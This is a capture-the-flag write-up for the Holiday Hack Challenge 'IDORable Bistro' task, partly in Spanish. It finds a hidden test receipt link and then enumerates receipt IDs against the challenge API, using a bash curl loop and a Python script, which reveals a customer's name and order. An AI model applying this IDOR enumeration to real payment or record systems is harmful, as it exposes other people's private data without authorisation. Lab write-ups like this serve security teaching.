I'm a teetotaling hacker. I sleep about 4 hours a night. Photography is my hobby, but the anachronistic sort: before 1900. Teaching people how to hack and protect systems is my passion.

I need your help with something urgent.

A gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.

Based on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.

I was [at a talk recently](https://www.youtube.com/watch?v=hzrhtHrhwno) and learned some interesting things about some of these payment systems. Let's use that receipt to dig deeper and unmask this gnome's true identity.

Hint>

QR Codes
From: Santa
Objective: IDORable Bistro
I have been seeing a lot of receipts lying around with some kind of QR code on them. I am pretty sure they are for Duke Dosis's Holiday Bistro. Interesting...see you if you can find one and see what they are all about...





## Solucion

```html
 <!-- For testing purposes only, not shown in production -->
            <!-- <div class="testing-section">
                <details>
                    <summary>Test Links (Staff Only)</summary>
                    <ul class="demo-links">
                        <li><a href="/receipt/a1b2c3d4">Sample Receipt</a></li>
                    </ul>
                </details>
            </div> -->
```



https://its-idorable.holidayhackchallenge.com/receipt/a1b2c3d4

### Forma 1

```bash
for i in {100..200} ; do curl -s -L  https://its-idorable.holidayhackchallenge.com/api/receipt\?id=$i ; done | grep -i frozen
{"customer":"Bartholomew Quibblefrost","date":"2025-12-20","id":139,"items":[{"name":"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)","price":19.0}],"note":"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk.","paid":true,"table":14,"total":19.0}

```

## Forma 2

```python
import requests
import time

# URL base del reto
url_base = "https://its-idorable.holidayhackchallenge.com/api/receipt?id="

print("Buscando al Gnomo amante del sushi congelado...")

# Probamos un rango de IDs alrededor del 113 (ej. 1 a 200)
for i in range(1, 200):
    try:
        r = requests.get(f"{url_base}{i}")
        if r.status_code == 200:
            data = r.json()
            # Buscamos la palabra clave "Frozen" o "Sushi" en los items
            items = str(data.get('items', [])).lower()
            
            # Si encontramos "frozen" o alguna referencia al gnomo
            if 'frozen' in items or 'gnome' in str(data).lower():
                print(f"\n[!] ¡ENCONTRADO en ID {i}!")
                print(f"Cliente: {data.get('customer')}")
                print(f"Items: {data.get('items')}")
                print(f"Nota: {data.get('note')}")
                print("-" * 40)
        
        # Pausa para no saturar el servidor (buena práctica)
        time.sleep(0.1)
        
    except Exception as e:
        print(f"Error en ID {i}: {e}")
```


R> Bartholomew Quibblefrost
